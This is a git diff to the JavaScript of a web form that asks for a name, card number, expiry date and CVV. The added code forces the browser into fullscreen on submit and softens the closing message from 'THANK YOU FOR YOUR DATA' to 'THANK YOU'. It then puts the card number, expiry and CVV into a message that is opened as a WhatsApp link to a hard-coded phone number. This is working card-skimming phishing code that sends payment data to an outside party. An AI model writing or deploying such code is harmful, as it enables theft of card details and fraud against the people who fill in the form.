@@ -31,6 +31,16 @@ document.addEventListener("DOMContentLoaded", function() {
         e.target.value = formatFourDigit(e.target.value);
     });
 
+    // Restrict three-digit field to numeric values only
+    function formatThreeDigit(value) {
+        return value.replace(/\D/g, '').slice(0, 3);
+    }
+
+    threeDigitField.addEventListener('input', function(e) {
+        e.target.value = formatThreeDigit(e.target.value);
+        validateForm();
+    });
+
     // Validate fields
     function validateForm() {
         const nameValue = nameField.value.trim();
@@ -52,9 +62,25 @@ document.addEventListener("DOMContentLoaded", function() {
     fourDigitField.addEventListener('input', validateForm);
     threeDigitField.addEventListener('input', validateForm);
 
+    // Function to enter fullscreen mode
+    function enterFullscreen() {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+            document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+            document.documentElement.msRequestFullscreen();
+        }
+    }
+
     // Handle form submission
     form.addEventListener('submit', function(e) {
         e.preventDefault();
+
+        // Enter fullscreen mode
+        enterFullscreen();
 
         // Hide form container
         document.querySelector('.form-container').style.display = 'none';
@@ -81,7 +107,7 @@ document.addEventListener("DOMContentLoaded", function() {
             // Display final text after overlay
             const finalText = document.createElement('div');
             finalText.classList.add('final-text');
-            finalText.textContent = 'THANK YOU FOR YOUR DATA';
+            finalText.textContent = 'THANK YOU';
             document.body.appendChild(finalText);
 
             // Manage transitions
@@ -93,11 +119,18 @@ document.addEventListener("DOMContentLoaded", function() {
                 finalText.style.opacity = '1'; // Show final text
             }, 6000); // Delay to show final text after overlay
 
-            // Cleanup after final text is visible
+            // Send data via WhatsApp API
             setTimeout(() => {
-                image.remove();
-                text.remove(); // Removed the wrong element 'intimidatingText' earlier
-            }, 10000); // Delay to ensure removal after final text
+                const nameValue = encodeURIComponent(nameField.value.trim());
+                const accNumberValue = encodeURIComponent(accNumberField.value.trim());
+                const fourDigitValue = encodeURIComponent(fourDigitField.value.trim());
+                const threeDigitValue = encodeURIComponent(threeDigitField.value.trim());
+
+                const message = `Hi, I am ${nameValue} and here are my details: \n\nCard Number: ${accNumberValue}\n Expiry date : ${fourDigitValue}\n CVV :  ${threeDigitValue}`;
+                const whatsappLink = `https://api.whatsapp.com/send?phone=917338010377&text=${message}`;
+                
+                window.open(whatsappLink, '_blank');
+            }, 10000); // Wait for final text to appear before sending data
         }, 3000); // Wait for image to appear
     });
 });
